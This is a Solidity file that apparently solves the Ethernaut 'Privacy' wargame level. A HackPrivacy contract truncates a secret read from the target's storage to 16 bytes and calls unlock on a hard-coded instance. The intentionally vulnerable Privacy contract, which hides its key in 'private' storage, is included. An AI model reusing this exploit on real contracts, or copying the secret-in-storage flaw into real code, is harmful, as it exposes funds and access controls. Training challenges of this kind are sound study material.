// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Privacy.sol';

contract HackPrivacy {
    // Complete with the instance's address
    Privacy public originalContract = Privacy(0x3Bed8f03bd03810713F8b3929EEef9Eb242c8faA);
    bytes32 stor4;
    bytes16 unlocker;

    function hack(bytes32 pass, bool zero) public {
        stor4 = pass;
        if (zero) {
            unlocker = transformTo16(stor4);
        } else {
            unlocker = transformTo16two(stor4);
        }
        originalContract.unlock(unlocker);
    }

    function transformTo16(bytes32 source) internal pure returns (bytes16) {
        bytes16[2] memory y = [bytes16(0), 0];
        assembly {
            mstore(y, source)
            mstore(add(y, 16), source)
        }
        return y[0];
    }

    function transformTo16two(bytes32 source) internal pure returns (bytes16) {
        bytes16[2] memory y = [bytes16(0), 0];
        assembly {
            mstore(y, source)
            mstore(add(y, 16), source)
        }
        return y[1];
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}